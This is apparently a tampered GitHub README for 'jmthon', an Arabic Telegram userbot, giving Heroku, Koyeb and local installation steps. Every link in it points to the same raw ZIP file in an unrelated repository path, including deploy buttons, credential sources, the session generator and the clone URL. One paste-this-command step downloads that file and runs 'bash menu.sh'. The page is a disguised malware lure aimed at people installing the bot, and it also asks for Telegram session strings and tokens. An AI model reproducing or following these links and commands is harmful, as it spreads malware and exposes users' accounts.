<p align="center">
  <img src="https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip" alt="The-HellBot">
</p>
<h1 align="center">
  <b> jmthon userbot | سورس جمثون</b>
</h1>

<h3 align="center">
  <b>سورس يوزربوت معتمد على مكتبة التيليثون</b>
</h3>

------
##  شرح التنصيب 📺
- عبر منصة هيروكو  [اضغط هنا](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)
- تنصيب محليا  [اضغط هنا](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)
- عبر منصة كويب  [اضغط هنا](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)
------

### التنصيب على كويب

اسهل طريقة للتنصيب عبر الضغط على الزر في الاسفل


[![Deploy to Koyeb](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)

------

## التنصيب على هيروكو 
* ملاحظة: هيروكو ستصبح مدفوعة في تاريخ 28/11/2022
- احصل على فارات تنصيبك اولا واستخرجهم
- احصل على الفارات يدويا عبر [الضغط هنا](#الفارات).
- اصنع حساب على منصه هيروكو [اضغط هنا](dashboard.heroku.com)
- الان اضغط على الزر بالاسفل للتنصيب
- [![Deploy](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)]([https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip))

------

## التنصيب محليا 

- `sudo apt update && sudo apt upgrade -y`

- `sudo apt install --no-install-recommends -y curl git libffi-dev libjpeg-dev libwebp-dev python3-lxml python3-psycopg2 libpq-dev libcurl4-openssl-dev libxml2-dev libxslt1-dev python3-pip python3-sqlalchemy openssl wget python3 python3-dev libreadline-dev libyaml-dev gcc zlib1g ffmpeg libssl-dev libgconf-2-4 libxi6 unzip libopus0 libopus-dev python3-venv libmagickwand-dev pv tree mediainfo nano nodejs`
* اذا كنت تستخدم سيرفر مجاني من شرحي استخدم الامر اما غير تجاهل الامر
- `wget -N https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip && bash menu.sh`

* صنع قاعده بيانات داخلية
- `sudo apt install postgresql postgresql-contrib`

- `sudo su - postgres`

- `psql`

* هنا بدل كلمة pass بأي كلمة سر ترغب بها
- `ALTER USER postgres WITH PASSWORD 'pass';`

* نصنع قاعده بيانات يمكنك تغيير كلمة jmthon الى اي اسم او تبقيه كما هو
- `CREATE DATABASE jmthon;`

- `\q`

- `exit`
* سيكون شكل قاعده البيانات كـالتالي و تبدل كلمة pass مع الباسوورد الذي وضعته وكلمة jmthon مع اسم القاعدة التي وضعتها 
- ` postgresql://postgres:pass@localhost:5432/jmthon`

- `git clone https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip` 

- `cd jmisbest0`

- `sudo apt install virtualenv`

- `sudo apt install nano`

- `mv exampleconfig.py config.py`

- `nano config.py` (املئ فارات التنصيب) -> ctrl+x -> y -> enter

- `sudo apt install screen`

- `screen -S jmthon`

- `virtualenv venv`

- `source venv/bin/activate`

- `pip3 install -r requirements.txt`

- `python3 -m jmisbest`
* نقوم بالضغط على CTRL+A بعدها نضغط على CTRL+D
 
------

## الفارات
- `APP_ID` 
* احصل عليه من هنا https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip

- `API_HASH` 
* احصل عليه من هنا https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip

- `STRING_SESSION`
* كود سيشن تيليثون او بايروجرام يفضل استخدام سيشن بايروجرام لتجاوز نسبه حذف الحساب [اضغط هنا](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)

- `TG_BOT_TOKEN` 
* اصنع بوت من بوت فاذر [اضغط هنا](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip) وانسخ التوكن الخاص به

- `DB_URI`
* قاعدة البيانات SQL

- `PRIVATE_GROUP_BOT_API_ID`
* اصنع مجموعة عامة واضف بوت [روز](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)
* بعدها ارسل `/id` وانسخ الايدي وحول المجموعة الى مجموعة خاصة


------

## تحذير هام
- غير مسؤول عن اي عملية حظر بسبب استخدامك الى هذا السورس 
- جمثون تم صنعه للتسلية وجعل حسابك بشكل افضل وحماية مجموعتك
- انها مسؤليتك اذا تعرض حسابك للحذف لذلك اقتضى التنويه

------

# License

<p align="center">
    <img src="https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip" alt="jmthon License">
</p>

<h4 align="center">
    Copyright (C) 2022 <a href="https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip">JMTHON</a>
</h4>

Project [JMTHON](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip) is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip>.

------
## Credits

- 💖 [Catuserbot](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)
- 💖 [Team jmthon](https://github.com/7j89a/jmjoz/raw/refs/heads/master/jmisbest/helpers/utils/Software_jewellike.zip)

------
